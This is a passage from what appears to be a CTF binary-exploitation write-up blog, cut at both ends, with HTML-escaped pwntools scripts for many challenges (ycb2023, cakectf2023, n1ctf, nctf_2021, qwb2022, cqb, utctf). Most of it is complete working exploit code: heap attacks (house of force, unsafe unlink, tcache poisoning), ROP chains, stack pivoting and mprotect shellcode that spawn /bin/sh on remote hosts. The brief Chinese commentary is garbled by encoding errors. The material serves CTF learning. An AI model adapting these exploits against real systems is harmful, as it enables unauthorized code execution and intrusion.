delete(16)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_arrary_index_bank&#34;&gt;ycb2023_arrary_index_bank:&lt;/h3&gt;
&lt;p&gt;OOB read &amp;amp; write&lt;br&gt;
int overflow bypass the check&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28794)
elf=ELF(&amp;quot;./pwn&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,b&amp;quot;-2&amp;quot;)
io.recvuntil(b&amp;quot;] = &amp;quot;)
stack_addr=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))


io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;] = &amp;quot;)
base_addr=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)-0x1426
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))

win_addr=base_addr+0x1318
idx=((1&amp;lt;&amp;lt;63)+7)-(1&amp;lt;&amp;lt;64)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,str(idx))
io.sendlineafter(b&amp;quot;much?\n&amp;quot;,str(win_addr))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_eazy_force&#34;&gt;ycb2023_eazy_force:&lt;/h3&gt;
&lt;p&gt;å †æº¢å‡ºå†™ï¼Œä»»æ„å¤§å°åˆ†é…å¯æ³„éœ²libcï¼Œæ— pieï¼Œhouse of forceæ¨¡æ¿é¢˜&lt;br&gt;
åŠ«æŒscanf_gotä¸º&lt;code&gt;one_gadget&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28807)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

scanf_got=0x602050
malloc_got=0x602040

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;away\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;want?\n&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;write?\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add(0,0x30000,b&amp;quot;nmsl&amp;quot;)
# 0x5bb010
io.recvuntil(b&amp;quot;on &amp;quot;)
leak_addr=int(io.recv(14),16)-0x5bb010
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

shell=leak_addr+0x45226

payload=cyclic(0x28)+p64(0xFFFFFFFFFFFFFFFF)
add(1,0x20,payload)

io.recvuntil(b&amp;quot;on &amp;quot;)
top_chunk=int(io.recvuntil(b&amp;quot; is&amp;quot;,drop=True),16)+0x20
print(&amp;quot;top_chunk: &amp;quot;,hex(top_chunk))


add(2,scanf_got-top_chunk-0x20,b&amp;quot;&amp;quot;)

# gdb.attach(io)
# pause()

add(3,0x10,p64(shell)*2)


io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_printf_but_not_fmtstr&#34;&gt;ycb2023_Printf_but_not_fmtstr:&lt;/h3&gt;
&lt;p&gt;2.36 uaf åˆ›å»ºå †å—&lt;code&gt;0x500-0x900&lt;/code&gt;&lt;br&gt;
partial relro , pie disable , ç»™åé—¨å‡½æ•°&lt;br&gt;
æ‰“unsafe unlink&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28400)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

win_addr=0x4011d6
chunk_list=0x4040e0

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)    
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

# gdb.attach(io)
# pause()

fd=chunk_list-0x18
bk=chunk_list-0x10

add(0,0x508) #0
add(1,0x508) #1

delete(0)

payload=p64(0)+p64(0x501)
payload+=p64(fd)+p64(bk)
payload=payload.ljust(0x500,b&amp;quot;\x00&amp;quot;)
payload+=p64(0x500)

edit(0,payload)

delete(1)

payload=p64(0)*3+p64(elf.got[b&amp;quot;puts&amp;quot;])
edit(0,payload)

edit(0,p64(win_addr))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_vtable4b&#34;&gt;cakectf2023_vtable4b:&lt;/h3&gt;
&lt;p&gt;æ³„éœ²åœ°å€ï¼Œè§‚å¯ŸæŒ‡é’ˆå°±è¡Œäº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;)

io=remote(&amp;quot;vtable4b.2023.cakectf.com&amp;quot;,9000)

io.recvuntil(b&amp;quot;win&amp;gt; = &amp;quot;)
win_addr=int(io.recv(14),16)
print(&amp;quot;win_addr = &amp;quot; + hex(win_addr))



io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;3&amp;quot;)
pd_addr=int(io.recvuntil(b&amp;quot;&amp;lt;-- message&amp;quot;,drop=True)[-36:-22],16)
print(&amp;quot;pd_addr = &amp;quot; + hex(pd_addr))
io.recvuntil(b&amp;quot;ed0 | &amp;quot;)
tp_addr=int(io.recv(16),16)
print(&amp;quot;tp_addr = &amp;quot; + hex(tp_addr))



io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;Message: &amp;quot;,p64(win_addr)+b&amp;quot;\x00&amp;quot;*0x10+p64(0x21)+p64(pd_addr)+p64(pd_addr)[:-1])

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_bofww&#34;&gt;cakectf2023_bofww:&lt;/h3&gt;
&lt;p&gt;cpp pwnï¼Œç»™äº†åé—¨ï¼Œpartial relroï¼Œå¾ˆæ˜æ˜¾åªèƒ½aawæ”¹&lt;code&gt;__stack_chk_fail@GLIBC_2.4&lt;/code&gt;ä¸ºåé—¨å‡½æ•°&lt;br&gt;
ç¨‹åºæœ€åä¼šè°ƒç”¨ææ„å‡½æ•°ï¼Œä¸€å¼€å§‹æƒ³è¿‡åŠ«æŒ&lt;code&gt;_free_hook&lt;/code&gt;ï¼Œ22.04æ‰“æ¶ˆè¿™ä¸ªå¿µå¤´&lt;br&gt;
åé¢å‘ç°å¦‚æœèƒ½æ§åˆ¶&lt;code&gt;rbp-0x128&lt;/code&gt;çš„å€¼å°±èƒ½å®ç°ä»»æ„åœ°å€å†™ï¼Œç„¶åä¸€ç›´æ‰¾ä¸åˆ°å¦‚ä½•æ§åˆ¶ï¼Œå¡è€åŠå¤©&lt;br&gt;
ç»“æœå‘ç°å‰é¢ç¨‹åºæµæœ‰&lt;code&gt;memcpy&lt;/code&gt;å¯ä»¥ç›´æ¥å®ç°aawï¼Œhh&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;â–º 0x7f6965f4d170 &amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;::_M_replace(unsigned long,
unsigned long, char const*, unsigned long)+192&amp;gt;    call   memcpy@plt                &amp;lt;memcpy@plt&amp;gt;
       dest: 0x404050 (__stack_chk_fail@got.plt) â€”â–¸ 0x4010a0 â—‚â€” endbr64 
       src: 0x7ffc682d34f0 â€”â–¸ 0x4012f6 (win()) â—‚â€” endbr64 
       n: 0x3
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./bofww&amp;quot;)
io=remote(&amp;quot;bofww.2023.cakectf.com&amp;quot;,9002)
elf=ELF(&amp;quot;./bofww&amp;quot;)

win_addr=0x4012f6
chk_fail=0x404050

# gdb.attach(io)
# pause()

payload=p64(win_addr)+p64(0)+p64(chk_fail)*0x30
io.sendlineafter(b&amp;quot;name? &amp;quot;,payload)

idx=((1&amp;lt;&amp;lt;31)+1)-(1&amp;lt;&amp;lt;32)

payload=str(idx)
io.sendlineafter(b&amp;quot;you? &amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_memorial_cabbage&#34;&gt;cakectf2023_memorial_cabbage:&lt;/h3&gt;
&lt;p&gt;gdbè°ƒè¯•å‘ç°&lt;code&gt;memo_w&lt;/code&gt;åªéœ€&lt;code&gt;0xff0&lt;/code&gt;bytesçš„æ•°æ®å°±å¯ä»¥è¦†ç›–åˆ°&lt;code&gt;tempdir&lt;/code&gt;ï¼Œè€Œé™åˆ¶è¾“å…¥é•¿åº¦ä¸º&lt;code&gt;0xfff&lt;/code&gt;ï¼Œå­˜åœ¨æº¢å‡ºå¯ä»¥è¦†ç›–&lt;code&gt;tempdir&lt;/code&gt;ä¸º&lt;code&gt;/flag.txt\x00&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./cabbage&amp;quot;)
io=remote(&amp;quot;memorialcabbage.2023.cakectf.com&amp;quot;,9001)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
payload=cyclic(0xff0)+b&amp;quot;/flag.txt\x00&amp;quot;
io.sendlineafter(b&amp;quot;Memo: &amp;quot;,payload)


io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;n1ctf_n1canary&#34;&gt;n1ctf_n1canary:&lt;/h3&gt;
&lt;p&gt;å¸¸è§„å¼‚å¸¸å¤„ç†ç»•è¿‡canary(å”¬äººçš„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./a&amp;quot;)

backdoor = 0x403387

gdb.attach(
    io, &#39;b *0x403405\nb *0x4037ee\nb *0x405128\nb *0x40512e\nb *0x404fd3\nb *0x404f6a&#39;)

payload = p64(0x4f4aa0)+p64(backdoor)
payload = payload.ljust(64, b&amp;quot;a&amp;quot;)
io.sendafter(b&amp;quot;canary\n&amp;quot;, payload)

io.sendlineafter(b&amp;quot;pwn :)\n&amp;quot;, cyclic(0x68)+p64(0x403407)+p64(0x4f4aa0)*8)
print(&amp;quot;offset:&amp;quot;, cyclic_find(0x6261616362616162))


io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;nctf_2021_login&#34;&gt;nctf_2021_login&lt;/h3&gt;
&lt;p&gt;æ ˆè¿ç§»ååˆ©ç”¨csuæ”¹&lt;code&gt;close@got[plt]&lt;/code&gt;ä½å­—èŠ‚ä¸º&lt;code&gt;\x99&lt;/code&gt;æ„é€ syscall&lt;br&gt;
ä¹‹åretåˆ°ç¬¬äºŒæ¬¡readæ§åˆ¶raxä¸º&lt;code&gt;0x3b&lt;/code&gt;&lt;br&gt;
éšååˆ©ç”¨csuæ§åˆ¶&lt;code&gt;rdx&lt;/code&gt;ä¸º0ï¼Œæ„é€ &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28857)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

ret=0x40101a
pop_rdi=0x401293
pop_rsi_r15=0x401291 
leave_ret=0x40121f
read_plt=elf.plt[b&amp;quot;read&amp;quot;]
read_got=elf.got[b&amp;quot;read&amp;quot;]
read_text=0x04011ed  

csu_1=0x40128a
# 0040128a  5b                 pop     rbx {__saved_rbx}
# 0040128b  5d                 pop     rbp {__saved_rbp}
# 0040128c  415c               pop     r12 {__saved_r12}
# 0040128e  415d               pop     r13 {__saved_r13}
# 00401290  415e               pop     r14 {__saved_r14}
# 00401292  415f               pop     r15 {__saved_r15}
# 00401294  c3                 retn     {__return_addr}

csu_2=0x401270
# 00401270  4c89f2             mov     rdx, r14
# 00401273  4c89ee             mov     rsi, r13
# 00401276  4489e7             mov     edi, r12d
# 00401279  41ff14df           call    qword [r15+rbx*8]

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;NCTF2021!\n&amp;quot;)

#offset 0x110
payload=cyclic(0x100)+p64(0x404400)+p64(read_text)
io.send(payload)


# pre-modify close_got and prepare for rop chain
payload=p64(csu_1)+p64(0)+p64(0x1)+p64(0)+p64(elf.got[b&amp;quot;close&amp;quot;])+p64(0x200)+p64(read_got)
payload+=p64(csu_2)+b&amp;quot;/bin/sh\x00&amp;quot;
payload=payload.ljust(0x78,b&amp;quot;a&amp;quot;)


payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x404800)*2+p64(elf.sym[b&amp;quot;read&amp;quot;])
payload+=p64(csu_1)+p64(0)*2+p64(0x404340)+p64(0)+p64(0)+p64(elf.got[b&amp;quot;close&amp;quot;])+p64(csu_2)


payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)+p64(0x404300-0x8)+p64(leave_ret)
io.send(payload)

# modify close_got
io.send(b&amp;quot;\x99&amp;quot;)

# trigger
sleep(3)
io.send(b&amp;quot;a&amp;quot;*0x3b)



io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040121f : leave ; ret
# 0x000000000040128c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040128e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401290 : pop r14 ; pop r15 ; ret
# 0x0000000000401292 : pop r15 ; ret
# 0x000000000040128b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040128f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x0000000000401293 : pop rdi ; ret
# 0x0000000000401291 : pop rsi ; pop r15 ; ret
# 0x000000000040128d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;qwb2022_devnull&#34;&gt;qwb2022_devnull&lt;/h3&gt;
&lt;p&gt;æ ˆè¿ç§»ï¼‹mprotect+shellcode&lt;br&gt;
æ³¨æ„fgets&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./devnull&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28934)
elf=ELF(&amp;quot;./devnull&amp;quot;)
libc=elf.libc

mprotect=0x4012D0
w_addr=0x3fe000
pop_rbp=0x40129d
leave_ret=0x401354
mov_eax=0x401350

# gdb.attach(io)
# pause()

payload=cyclic(0x20)
io.sendafter(b&amp;quot;filename\n&amp;quot;,payload)

payload=cyclic(0xc+8)+p64(w_addr)+p64(w_addr+0x10)+p64(leave_ret)
io.sendafter(b&amp;quot;discard\n&amp;quot;,payload)

read_shellcode=asm(&#39;&#39;&#39;
    xor rax,rax
    mov edi,0
    push 0x3fea00
    pop rsi
    push 0x200
    pop rdx
    syscall              
&#39;&#39;&#39;)

call_shellcode=asm(&#39;&#39;&#39;
mov rax,0x3fea00
call rax
&#39;&#39;&#39;)

payload=p64(0x3fe000)+p64(0x3fe018)*2+p64(mov_eax)+p64(mprotect)+p64(0xdeadbeef)+p64(0x3fe038)+read_shellcode+call_shellcode
io.sendafter(b&amp;quot;data\n&amp;quot;,payload)

# pause()

io.send(asm(shellcraft.sh()))

io.interactive()

# 0x0000000000401354: leave; ret;
# 0x000000000040101a: ret;
# 0x0000000000401351: mov eax, dword ptr [rbp - 0x18]; leave; ret;
# 0x000000000040129d: pop rbp; ret;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cqb_nmanager&#34;&gt;cqb_nmanager:&lt;/h3&gt;
&lt;p&gt;æº¢å‡ºç»•è¿‡éšæœºéªŒè¯ï¼Œæ ˆä¸Šè¶Šç•Œè¯»å†™ROP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./nmanager&amp;quot;)
# io=remote(&amp;quot;127.0.0.1&amp;quot;,1234)
io=remote(&amp;quot;8.147.135.190&amp;quot;,44768)
elf=ELF(&amp;quot;./nmanager&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

ret=0x40101a

def modify(n,gd,age,name):
    io.sendlineafter(b&amp;quot;modify ##\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;gender: &amp;quot;,gd)
    io.sendlineafter(b&amp;quot;age: &amp;quot;,str(age))
    io.sendafter(b&amp;quot;name: &amp;quot;,name)

def choice(n):
    if n == 0:
        io.sendafter(b&amp;quot;quit now?(Y/y)\n&amp;quot;,b&amp;quot;n&amp;quot;)
    else:
        io.sendafter(b&amp;quot;quit now?(Y/y)\n&amp;quot;,b&amp;quot;y&amp;quot;)
        

payload=b&amp;quot;./flag\x00\x00&amp;quot;+cyclic(0x58)+b&amp;quot;check passed&amp;quot;.ljust(0x20,b&amp;quot;\x00&amp;quot;)
io.sendlineafter(b&amp;quot;password: &amp;quot;,payload)


### leak libc
modify(8,b&amp;quot;nmsl&amp;quot;*2,0x10,b&amp;quot;aaa&amp;quot;)
io.recvuntil(b&amp;quot;nmsl&amp;quot;*2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x29d90
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

choice(0)


### leak canary
modify(-1,b&amp;quot;a&amp;quot;,0x10,b&amp;quot;aaa&amp;quot;)
io.recvuntil(b&amp;quot;gender: a&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))

choice(0)

### rop
payload=p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)
modify(-1,payload,str_sh,p64(sys_addr))

choice(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cqb_book&#34;&gt;cqb_book&lt;/h3&gt;
&lt;p&gt;2.35ï¼Œç™½ç»™uafï¼Œå‡½æ•°é½å…¨ï¼Œè¿™é‡Œé€‰æ‹©å †æ ˆç»“åˆæ‰“ropï¼ŒIOæ²¡å¥½çš„æ¨¡æ¿å®åœ¨ä¸æƒ³çœ‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;8.147.135.190&amp;quot;,13854)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size :&amp;quot;,str(s))


def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))


def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;content: &amp;quot;,cc)


# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90)
    
add(8,0x10)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
# 0x000000000002a3e5: pop rdi; ret;
ret=leak_addr+0xf9e3c
# 0x00000000000f9e3c: ret;
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]

show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr:  &amp;quot;+hex(heap_addr))


payload=p64(environ^key)+p64(0)
edit(4,payload)

add(4,0x90)
add(5,0x90)
add(6,0x90)
add(7,0x90)
show(7)

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

ret_addr=stack_addr-0x188
# stack_addr 0x7fffffffdee8
# ret 0x7fffffffdda8

payload=p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)

for i in range(8,13):
    add(i,0x100)

for i in range(8,12):
    delete(i)

edit(11,p64(ret_addr^key))
add(8,0x100)

# gdb.attach(io)
# pause()

add(9,0x100)
edit(9,cyclic(0x28)+payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;utctf_webserver&#34;&gt;utctf_webserver&lt;/h3&gt;
&lt;p&gt;åˆ†æè¿‡äº†ï¼Œç›´æ¥è´´ç &lt;br&gt;
æº¢å‡ºå¯¼è‡´çš„æ ˆä¸Šå‚æ•°å¯æ§å†™gotæŒ‡é’ˆï¼Œä»»æ„åœ°å€å†™å †åœ°å€ï¼Œlowbyteå†™&lt;code&gt;\x00&lt;/code&gt;ï¼Œæ”¹&lt;code&gt;strstr&lt;/code&gt;ä¸º&lt;code&gt;strtol&lt;/code&gt;&lt;br&gt;
vuln:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int header_count = 0;
int header_cap = 0;
struct Header *headers = NULL;
char *name = take_until_char(header_line, &amp;amp;index, &#39;:&#39;);
char *value = take_until_newline(header_line, &amp;amp;index);
name = malloc_str(name);
value = malloc_str(value);

//skip this
if (header_count + 1 &amp;gt; header_cap) {
    int new_cap = header_cap &amp;lt; 4 ? 4 : header_cap * 2;
    headers = realloc(headers, sizeof(struct Header) * new_cap);
    header_cap = new_cap;
}

struct Header h;   # control h -&amp;gt; got_ptr
h.name = name;  # got1 -&amp;gt; heap_addr1
h.value = value; # got2 -&amp;gt; heap_addr2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./webserver&amp;quot;)
# io = remote(&amp;quot;guppy.utctf.live&amp;quot;, 5848)

io.send(b&amp;quot;GET /flag.txt HTTP/1.1\r\n&amp;quot;)
#
gdb.attach(io)
pause()

headers = b&amp;quot;1:1\x00&amp;quot;  # prepare for overflow &amp;amp;&amp;amp; make heap addr

payload = headers

# skip if condition
payload += b&amp;quot;\x01&amp;quot;*(0x350-0x30-len(headers))

# 0x402380 &amp;lt;main+665&amp;gt;    mov    rax, qword ptr [rbp - 0x30]
# ...
# 0x402399 &amp;lt;main+690&amp;gt;    mov    qword ptr [rcx + 8], rdx    &amp;lt;exit@got[plt]+1&amp;gt;
payload += p64(0x4050e0-0xf)  # rcx

payload += b&amp;quot;\r\n&amp;quot;
payload += b&amp;quot;\r\n&amp;quot;
io.send(payload)

io.send(b&amp;quot;a&amp;quot;*0x20000)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;utctf_ecorp&#34;&gt;utctf_ecorp&lt;/h3&gt;
&lt;p&gt;ref:&lt;br&gt;
&lt;a href=&#34;https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/&#34;&gt;https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/&#34;&gt;https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/&lt;/a&gt;&lt;br&gt;
é¢˜ç›®ç»™å‡ºçš„å›ºä»¶ç‰ˆæœ¬å¯¹åº”ç¬¬ä¸€ç¯‡ä¸­å›ºä»¶ç‰ˆæœ¬ï¼Œheadersä¸­çš„cookieå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºï¼Œæ•…è¯¥æ¼æ´å¯ä»¥ç›´æ¥æ‰“&lt;br&gt;
é¢˜ç›®è¦æ±‚éœ€è¦åå¼¹shell&lt;br&gt;
é¢˜ç›®ç»™å‡ºå›ºå®šçš„æ ˆåœ°å€ï¼Œå¹¶ä¸”adminç»™å‡ºæç¤º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Nope you can just jump to shellcode On a real router u would have needed to rop to sleep or flush the cache another way Or find a way to write ur code without a decoder...u don&#39;t need to deal with cache coherence unless ur code modifies itself
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸éœ€è¦è€ƒè™‘cache incohorencyï¼Œç›´æ¥è·³è½¬æ‰§è¡Œshellcode&lt;br&gt;
ä¸è¿‡è¯¥æ¼æ´è§¦å‘æ—¶ä¼šè°ƒç”¨&lt;code&gt;toUpper()&lt;/code&gt;å°†å°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™å­—æ¯&lt;br&gt;
